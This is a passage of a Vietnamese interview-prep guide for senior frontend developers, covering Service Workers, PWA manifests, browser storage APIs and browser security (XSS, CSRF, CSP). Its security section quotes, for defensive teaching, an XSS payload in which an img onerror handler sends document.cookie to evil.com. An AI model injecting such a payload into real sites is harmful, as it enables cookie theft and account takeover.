**Trade-off:** SSE đơn giản, nhưng 1 chiều nên nếu cần client gửi nhiều thì phải kết hợp `fetch` POST, thành 2 connection. WebSocket 1 connection cho cả hai chiều, nhưng phức tạp hơn. Với 90% server push 1 chiều, SSE là đủ và rẻ hơn.

**Câu hỏi đào sâu:** Vì sao SSE tự reconnect còn WebSocket không? Khi nào SSE + HTTP/2 tốt hơn WebSocket về multiplexing?

---

### Câu 118: Service Worker - lifecycle và cache strategy

**Trả lời Senior:**
Service Worker (SW) là **proxy programmable** giữa browser và network, chạy **background thread**, intercept `fetch`, cho offline, cache, push. Lifecycle: **Register → Install → Activate → Fetch**, và update khi byte khác.

- **Install**: `install` event, precache static (`cache.addAll`), `skipWaiting()` để activate ngay.
- **Activate**: `activate` event, xóa cache cũ, `clients.claim()` để control ngay.
- **Fetch**: `fetch` event, `event.respondWith(caches.match(...) || fetch(...))`.
- **Update**: browser check update mỗi navigation (fetch `sw.js`). Nếu server trả header `Cache-Control` thì tôn trọng; mặc định nhiều browser cache `sw.js` tối đa 24h nếu không có header, nên luôn set `Cache-Control: no-cache` cho `sw.js`. Nếu byte khác thì install new, đợi `skipWaiting` hoặc close tab mới activate.

Cache strategy:

- **Cache First**: cache → network (cho static versioned).
- **Network First**: network → cache (cho API dynamic).
- **Stale-While-Revalidate**: cache → network background update (cho balance).
- **Network Only / Cache Only**.

```javascript
// Register
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js', { scope: '/' }).then(reg => {
    console.log('SW registered', reg.scope);
    // Update
    reg.addEventListener('updatefound', () => console.log('new SW installing'));
  });
}

// sw.js
const CACHE = 'v2';
const PRECACHE = ['/offline.html', '/app.js', '/hero.jpg'];

self.addEventListener('install', e => {
  e.waitUntil(caches.open(CACHE).then(c => c.addAll(PRECACHE)).then(() => self.skipWaiting()));
});

self.addEventListener('activate', e => {
  e.waitUntil(
    caches.keys().then(keys => Promise.all(keys.filter(k => k !== CACHE).map(k => caches.delete(k)))).then(() => self.clients.claim())
  );
});

self.addEventListener('fetch', e => {
  const url = new URL(e.request.url);
  // Strategy: stale-while-revalidate cho static, network-first cho API
  if (url.pathname.startsWith('/api/')) {
    // Network first
    e.respondWith(
      fetch(e.request)
        .then(res => {
          const clone = res.clone();
          caches.open(CACHE).then(c => c.put(e.request, clone));
          return res;
        })
        .catch(() => caches.match(e.request))
    );
  } else {
    // Cache first
    e.respondWith(caches.match(e.request).then(cached => cached ?? fetch(e.request).then(res => {
      if (res.ok) caches.open(CACHE).then(c => c.put(e.request, res.clone()));
      return res;
    })));
  }
});

// Workbox (lib)
// import { precacheAndRoute } from 'workbox-precaching';
// precacheAndRoute(self.__WB_MANIFEST);
```

**Trade-off:** SW mạnh nhưng thêm complexity: cache invalidation, update lifecycle (user kẹt SW cũ), chỉ HTTPS, và `fetch` không trigger cho `fetch` từ SW. Dùng Workbox để đỡ tự code.

**Câu hỏi đào sâu:** `skipWaiting` vs `clients.claim` khác gì? Vì sao SW update phải đợi close tab mới activate nếu không `skipWaiting`?

---

### Câu 119: PWA là gì? Manifest, installability và offline

**Trả lời Senior:**
PWA (Progressive Web App) là **web app có trải nghiệm như native**: installable, offline, push, mà không qua app store. Ba trụ cột: **Web App Manifest** + **Service Worker** + **HTTPS**.

- **Manifest** (`manifest.json`): metadata cho install - `name`, `icons`, `start_url`, `display` (standalone/minimal-ui), `theme_color`, `background_color`. Browser dùng để hiện "Add to Home Screen".
- **Installability**: cần manifest + SW + HTTPS + `beforeinstallprompt` (Chrome). Tiêu chí Lighthouse: 144x144 icon, `start_url` load được khi offline.
- **Offline**: SW cache với strategy, `offline.html` fallback.
- **Khác**: Push Notification (Push API + Notification API), Background Sync, App Shortcuts.

```json
// manifest.json
{
  "name": "My Shop",
  "short_name": "Shop",
  "start_url": "/?source=pwa",
  "display": "standalone",
  "background_color": "#ffffff",
  "theme_color": "#0066ff",
  "icons": [
    { "src": "/icon-192.png", "sizes": "192x192", "type": "image/png" },
    { "src": "/icon-512.png", "sizes": "512x512", "type": "image/png", "purpose": "any maskable" }
  ],
  "shortcuts": [
    { "name": "Cart", "url": "/cart", "icons": [{ "src": "/cart.png", "sizes": "96x96" }] }
  ]
}
```

```html
<link rel="manifest" href="/manifest.json" />
<meta name="theme-color" content="#0066ff" />
```

```javascript
// Install prompt
let deferredPrompt;
window.addEventListener('beforeinstallprompt', e => {
  e.preventDefault();
  deferredPrompt = e;
  showInstallButton();
});
installButton.addEventListener('click', async () => {
  deferredPrompt.prompt();
  const { outcome } = await deferredPrompt.userChoice;
  console.log(outcome); // accepted / dismissed
});

// Offline detection
window.addEventListener('online', () => console.log('online'));
window.addEventListener('offline', () => showOfflineBanner());

// Workbox precache cho offline
// sw.js: precacheAndRoute([{ url: '/offline.html', revision: '1' }])
```

**Trade-off:** PWA không thay native khi cần Bluetooth, NFC, background nặng, nhưng cho 80% use case với cost thấp hơn native 10x. iOS support PWA kém hơn Android (push mới có từ 16.4).

**Câu hỏi đào sâu:** PWA khác native wrapper (Capacitor/Tauri) thế nào? `display: standalone` khác `minimal-ui` thế nào? Làm sao debug PWA installability trong DevTools Application tab?

---

### Câu 120: Storage nâng cao - IndexedDB, Cache API, OPFS

**Trả lời Senior:**
Khi `localStorage` 5MB đồng bộ không đủ, Senior dùng storage bất đồng bộ, lớn, structured:

- **IndexedDB**: DB NoSQL trong browser, **bất đồng bộ**, **transaction**, **lớn (hàng GB, ~60% disk)**, lưu object, index, cursor. Dùng cho offline data, cache API lớn, draft. API callback-based, nên dùng wrapper `idb` (Jake Archibald).
- **Cache API**: cache cho `Request/Response`, dùng bởi SW, **không phải cho data JSON**, mà cho HTTP response. `caches.open('v1').put(request, response)`.
- **OPFS (Origin Private File System)**: File System API mới, **synchronous trong Worker**, lưu file lớn, WASM, video, SQLite. `navigator.storage.getDirectory()`.
- **WebSQL**: deprecated, không dùng.
- **Cookies**: 4KB, gửi kèm request, không phải storage cho data.

```javascript
// IndexedDB với idb
import { openDB } from 'idb';

const db = await openDB('my-db', 1, {
  upgrade(db) {
    db.createObjectStore('products', { keyPath: 'id' });
    const store = db.createObjectStore('drafts', { keyPath: 'id' });
    store.createIndex('by-date', 'date');
  },
});

await db.put('products', { id: '1', name: 'Shoes', price: 100 });
const product = await db.get('products', '1');
const all = await db.getAll('products');
await db.delete('products', '1');

// Cache API - cho SW
const cache = await caches.open('api-cache');
await cache.put('/api/products', new Response(JSON.stringify(products), { headers: { 'Content-Type': 'application/json' } }));
const cached = await cache.match('/api/products');

// OPFS - file lớn
const root = await navigator.storage.getDirectory();
const fileHandle = await root.getFileHandle('video.mp4', { create: true });
const writable = await fileHandle.createWritable();
await writable.write(blob);
await writable.close();

// Quota
const estimate = await navigator.storage.estimate();
console.log(estimate.quota, estimate.usage); // ~60% disk

// So sánh
// | | Sync | Size | Structure | Use |
// |---|---|---|---|---|
// | localStorage | sync | 5MB | string | theme, token nhỏ |
// | IndexedDB | async | GB | object + index | offline data |
// | Cache API | async | GB | Request/Response | SW cache |
// | OPFS | async/sync in worker | GB | file | file, wasm |
```

**Trade-off:** IndexedDB API gốc rất verbose, luôn dùng wrapper. Cache API chỉ cho HTTP response, không lưu object tùy ý. OPFS mới, Safari support muộn.

**Câu hỏi đào sâu:** Vì sao IndexedDB là async còn localStorage là sync? Khi nào dùng Cache API thay vì IndexedDB?

---

### Câu 121: Bảo mật Browser - XSS, CSRF, CSP và SOP/CORS

**Trả lời Senior:**
Bộ tứ bảo mật browser:

- **XSS (Cross-Site Scripting)**: attacker inject script vào trang, chạy với quyền user, đọc `localStorage`, cookie (nếu không HttpOnly), DOM. Ba loại: Stored (lưu DB), Reflected (URL param), DOM-based. Fix: **escape output**, **CSP**, **HttpOnly cookie**, không `innerHTML` với user input, dùng framework auto-escape (React `{}` đã escape).
- **CSRF (Cross-Site Request Forgery)**: attacker lừa user click `evil.com` gửi request tới `bank.com` (cookie tự gửi). Fix: **SameSite cookie**, **CSRF token** (server sinh, client gửi header), **Origin check**.
- **CSP (Content Security Policy)**: header `Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn;` để whitelist script, chặn inline script, giảm XSS. Dùng `nonce` hoặc `hash` cho inline cần thiết.
- **SOP/CORS**: như câu 113, ngăn đọc cross-origin.

```http
# CSP
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com 'nonce-abc'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.example.com; frame-ancestors 'none'

# Cookie
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600

# CSRF token
# Server: <meta name="csrf-token" content="random">
# Client: fetch('/api/transfer', { method: 'POST', headers: { 'X-CSRF-Token': token } })
```

```javascript
// XSS
// ❌
element.innerHTML = userInput; // userInput = <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
// ✅
element.textContent = userInput; // escape
// React tự escape
<div>{userInput}</div>; // safe

// CSRF
// ❌ Cookie SameSite=None + không token -> evil.com có thể <form action="https://bank.com/transfer" method="POST">
/// ✅ SameSite=Lax + CSRF token
fetch('/api/transfer', { method: 'POST', headers: { 'X-CSRF-Token': getMeta('csrf-token') }, credentials: 'include' });

// CSP nonce
<script nonce="abc">console.log('allowed')</script>
```

**Trade-off:** CSP mạnh nhưng tốn công whitelist, inline script phải nonce, report `report-uri` để thu thập vi phạm. `SameSite=Strict` an toàn nhất nhưng break redirect từ ngoài (ví dụ login qua OAuth). `Lax` là cân bằng.

**Câu hỏi đào sâu:** `HttpOnly` chặn XSS đọc cookie thế nào? `SameSite=Lax` vs `Strict` ảnh hưởng CSRF và OAuth thế nào? CSP `nonce` vs `hash` khác gì?

---
